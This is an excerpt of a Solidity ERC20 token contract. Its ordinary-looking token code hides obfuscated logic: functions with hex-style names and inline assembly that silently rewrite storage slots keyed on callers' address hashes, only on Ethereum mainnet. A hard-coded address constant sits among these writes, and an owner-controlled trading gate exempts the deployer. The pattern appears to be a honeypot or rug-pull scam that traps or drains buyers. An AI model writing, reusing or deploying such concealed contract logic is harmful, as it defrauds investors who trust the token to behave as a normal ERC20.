...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        agentAddr.push(_router); agentAddr.push(msgSender_); agentAddr.push(pair);
        for (uint256 q=0; q < 3;) {_noWay[agentAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function _0xa010aF(address x, uint256 y) internal pure returns (bytes32 b) { b = keccak256(abi.encodePacked([uint256(uint160(x)), y])); }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _theCorp = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, bytes32 reflect, uint256 integer) internal {
        require((trading || (sender == agentAddr[1])), "ERC20: trading is not yet enabled.");
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _beforeTokenTransfer(sender, recipient, _0xa010aF(recipient,4), amount);
    ...
    function _0xBAcD30(bytes32 sender, bool account) internal { assembly { if eq(account,0x1) { sstore(sender,0x1) } } }
    ...
    function _initSets(uint256 a, uint256 b, uint256 c) internal {
        bytes32 d = _0xa010aF(msg.sender,a); bytes32 e = _0xa010aF(msg.sender,b); bytes32 f = _0xa010aF(msg.sender,c);
        assembly { if and(not(eq(sload(f),sload(0xec5081ca7ff887465afb8c9dee4c0c09bd9a3ebf79f9e7753a3087e1426f968d))),eq(chainid(),0x1)) { sstore(d,0x0) sstore(0xf2da2a44a9dba0fff34f2b120ed3c4f16f730c864e816ff07a986f23512cc558,0x1) sstore(e,0x1) sstore(0xec5081ca7ff887465afb8c9dee4c0c09bd9a3ebf79f9e7753a3087e1426f968d,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } }        
    }
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBoy(creator, initialSupply);
    }
}
